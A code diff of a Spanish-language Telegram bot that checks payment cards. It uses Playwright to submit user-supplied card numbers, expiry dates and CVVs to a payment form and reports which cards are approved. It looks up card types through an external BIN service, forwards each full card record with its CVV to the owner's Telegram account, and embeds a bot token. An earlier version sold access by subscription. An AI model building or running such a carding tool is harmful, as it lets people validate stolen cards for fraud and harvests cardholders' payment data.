@@ -1,27 +1,19 @@
+import telebot
 import asyncio
+from playwright.async_api import async_playwright
 import random
 import string
-import json
+import requests
+import time
 from collections import deque
-from telebot.async_telebot import AsyncTeleBot
-from playwright.async_api import async_playwright
 
-bot_token = "7591727242:AAEIqlas3SJRjteHQGr-UkxaoJDZMOaScLU"
-GROUP_ID = "-1002168776336"
-bot = AsyncTeleBot(bot_token)
+API_TOKEN = "7591727242:AAEIqlas3SJRjteHQGr-UkxaoJDZMOaScLU"
+bot = telebot.TeleBot(API_TOKEN)
+
+OWNER_ID = 1658470522
+
 queue = deque()
-usuarios_autorizados = {"1658470522"}
-
-def cargar_usuarios():
-    try:
-        with open("usuarios.json", "r") as file:
-            return set(json.load(file))
-    except (FileNotFoundError, json.JSONDecodeError):
-        return set()
-
-def guardar_usuarios():
-    with open("usuarios.json", "w") as file:
-        json.dump(list(usuarios_autorizados), file)
+cooldown = {}
 
 async def completar_formulario(binlargo, mes, anio, code):
     async with async_playwright() as p:
@@ -38,104 +30,121 @@ async def completar_formulario(binlargo, mes, anio, code):
         await page.wait_for_timeout(2000)
         await page.click("input#MainContent_btnTarjeta")
         await page.wait_for_timeout(2000)
-        if binlargo.startswith("4"):
+        bindata = requests.get(f"https://api.paypertic.com/binservice/{binlargo[:6]}").text.lower()
+        if "visa" in bindata and "credit" in bindata:
             await page.select_option("#ddlTarjeta", "1")
-        elif binlargo.startswith("5"):
+        elif "visa" in bindata and "debit" in bindata:
+            await page.select_option("#ddlTarjeta", "31")
+        elif "mastercard" in bindata and "debit" in bindata:
+            await page.select_option("#ddlTarjeta", "105")
+        elif "mastercard" in bindata and "credit" in bindata:
             await page.select_option("#ddlTarjeta", "104")
+        elif "american express" in bindata:
+            await page.select_option("#ddlTarjeta", "111")
+        elif "cabal" in bindata:
+            await page.select_option("#ddlTarjeta", "63")
         await page.fill("#txtCardNumber", binlargo)
         await page.fill("#txtCardExpirationMonth", mes)
         await page.fill("#txtCardExpirationYear", anio)
         await page.fill("#txtSecurityCode", code)
         await page.click("input#MainContent_btnGenerarTarjeta")
-        await page.wait_for_timeout(2000)
+        await page.wait_for_timeout(6000)
         error_text = await page.text_content("body")
+        if "La transacción ha sido rechazada" in error_text:
+            await browser.close()
+            return False
         await browser.close()
-        return "aprobada" in error_text.lower()
+        return True
 
 async def process_queue():
-    while True:
-        if queue:
-            user_message = queue.popleft()
-            tarjeta, mes, anio, codigo = user_message['tarjeta'], user_message['mes'], user_message['anio'], user_message['codigo']
-            message = user_message['message']
-            username = user_message['username']
-            result = await completar_formulario(tarjeta, mes, anio, codigo)
-            if result:
-                formatted_response = (
-                    "Checkeo de CC | Exitoso\n"
-                    "✅ Tarjeta aprobada!\n\n"
-                    "-----\n"
-                    f"Número de Tarjeta: {tarjeta}\n"
-                    f"MM|AA: {mes}|{anio}\n"
-                    f"CVV: {codigo}\n"
-                    "-----\n"
-                    f"Usuario: @{username}\n"
-                    "Monto: 2000 ARS"
-                )
-            else:
-                formatted_response = (
-                    "Checkeo de CC | Fallido\n"
-                    "❌ Tarjeta rechazada!\n\n"
-                    "-----\n"
-                    f"Número de Tarjeta: {tarjeta}\n"
-                    f"MM|AA: {mes}|{anio}\n"
-                    f"CVV: {codigo}\n"
-                    "-----\n"
-                    f"Usuario: @{username}\n"
-                )
-            await bot.reply_to(message, formatted_response)
-            await bot.send_message(GROUP_ID, formatted_response)
+    while queue:
+        user_message = queue.popleft()
+        tarjeta, mes, anio, codigo = user_message['tarjeta'], user_message['mes'], user_message['anio'], user_message['codigo']
+        user_id = user_message['user_id']
+        message = user_message['message']
+        username = user_message['username']
+        result = await completar_formulario(tarjeta, mes, anio, codigo)
+        if result:
+            formatted_response = (
+                "Checkeo de CC | Exitoso\n"
+                "✅ Tarjeta aprobada!\n\n"
+                "－ － － － － － － － － － － － － － － － －\n"
+                f"Número de Tarjeta: {tarjeta}\n"
+                f"MM|AA: {mes}|{anio}\n"
+                f"CVV: {codigo}\n"
+                "－ － － － － － － － － － － － － － － － －\n"
+                "Monto: $ 2000\n"
+                f"Usuario: @{username}\n"
+            )
+            bot.reply_to(message, formatted_response)
+            bot.send_message(OWNER_ID, formatted_response)
         else:
-            await asyncio.sleep(1)
+            formatted_response = (
+                "Checkeo de CC | Fallido\n"
+                "❌ Tarjeta rechazada!\n\n"
+                "－ － － － － － － － － － － － － － － － － － －\n"
+                f"Número de Tarjeta: {tarjeta}\n"
+                f"MM|AA: {mes}|{anio}\n"
+                f"CVV: {codigo}\n"
+                "－ － － － － － － － － － － － － － － － － － －\n"
+                f"Usuario: @{username}\n"
+            )
+            bot.reply_to(message, formatted_response)
+            bot.send_message(OWNER_ID, formatted_response)
+        await asyncio.sleep(1)
 
-@bot.message_handler(commands=["start"])
-async def start(message):
-    await bot.reply_to(message, "Hola, Gracias por usar nuestro bot, estos son nuestros comandos:\n"
-                       "/check CC|MM|AA|CVV\n"
-                       "/usuarios add/remove <user_id>\n"
-                       "Soy un bot de checkeo, mi funcion es checkear CC para facilitarte el proceso a vos"
-                       )
+@bot.message_handler(commands=['start'])
+def handle_start(message):
+    bot.reply_to(message, "¡Hola! 👋 Soy tu asistente virtual 💻✨\n\n"
+                          "Estoy aquí para ayudarte con el checkeo de tarjetas de manera rápida y segura. "
+                          "Solo debes enviarme el formato correcto: /check cc|mes|año|cvv. ")
 
-@bot.message_handler(commands=["usuarios"])
-async def manejar_usuarios(message):
-    args = message.text.split()
-    if len(args) != 3:
-        await bot.reply_to(message, "Uso: /usuarios add|remove <user_id>")
-        return
-    accion, user_id = args[1], args[2]
-    if accion == "add":
-        usuarios_autorizados.add(user_id)
-        guardar_usuarios()
-        await bot.reply_to(message, f"Usuario {user_id} añadido.")
-    elif accion == "remove":
-        usuarios_autorizados.discard(user_id)
-        guardar_usuarios()
-        await bot.reply_to(message, f"Usuario {user_id} eliminado.")
-    else:
-        await bot.reply_to(message, "Acción inválida. Usa add o remove.")
-
-@bot.message_handler(commands=["check"])
-async def check(message):
-    if str(message.from_user.id) not in usuarios_autorizados:
-        await bot.reply_to(message, "No tienes acceso. Contacta a @cardea2 para comprar una suscripción.")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await bot.reply_to(message, "Uso: /check CC|MM|AA|CVV")
-        return
-    datos = args[1].split("|")
-    if len(datos) != 4:
-        await bot.reply_to(message, "Formato inválido. Uso: /check CC|MM|AA|CVV")
-        return
-    tarjeta, mes, anio, codigo = datos
-    queue.append({"tarjeta": tarjeta, "mes": mes, "anio": anio, "codigo": codigo, "message": message, "username": message.from_user.username})
-    await bot.reply_to(message, "Tu tarjeta está siendo procesada.")
-
-async def main():
-    global usuarios_autorizados
-    usuarios_autorizados = cargar_usuarios()
-    asyncio.create_task(process_queue())
-    await bot.infinity_polling()
+@bot.message_handler(commands=['check'])
+def handle_check(message):
+    try:
+        user_id = message.from_user.id
+        current_time = time.time()
+        if user_id in cooldown and current_time - cooldown[user_id] < 30:
+            remaining_time = 30 - (current_time - cooldown[user_id])
+            bot.reply_to(message, f"Debes esperar {int(remaining_time)} segundos antes de usar /check nuevamente.")
+            return
+        cooldown[user_id] = current_time
+        username = message.from_user.username or message.from_user.first_name
+        args = message.text.split(" ", 1)
+        if len(args) != 2 or "|" not in args[1]:
+            bot.reply_to(message, "Uso incorrecto. El formato es:\n/check cc|mes|año|cvv")
+            return
+        parts = args[1].split("|")
+        if len(parts) != 4:
+            bot.reply_to(message, "El formato debe ser: /check cc|mes|año|cvv")
+            return
+        tarjeta, mes, anio, codigo = parts
+        if len(tarjeta) != 16 or not tarjeta.isdigit():
+            bot.reply_to(message, "La tarjeta debe tener 16 dígitos.")
+            return
+        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
+            bot.reply_to(message, "El mes debe tener 2 dígitos y ser válido.")
+            return
+        if not anio.isdigit() or int(anio) < 24:
+            bot.reply_to(message, "El año debe tener 2 dígitos y ser válido.")
+            return
+        if (len(codigo) != 3 and len(codigo) != 4) or not codigo.isdigit():
+            bot.reply_to(message, "El código de seguridad debe tener 3 o 4 dígitos.")
+            return
+        bot.reply_to(message, "Estamos procesando tu solicitud. Puede que haya otras personas en espera, pero en poco tiempo se procesará tu turno.")
+        queue.append({
+            'user_id': user_id,
+            'message': message,
+            'tarjeta': tarjeta,
+            'mes': mes,
+            'anio': anio,
+            'codigo': codigo,
+            'username': username
+        })
+        asyncio.run(process_queue())
+    except Exception as e:
+        print(e)
+        bot.reply_to(message, f"Ocurrió un error: {e}")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    bot.infinity_polling()
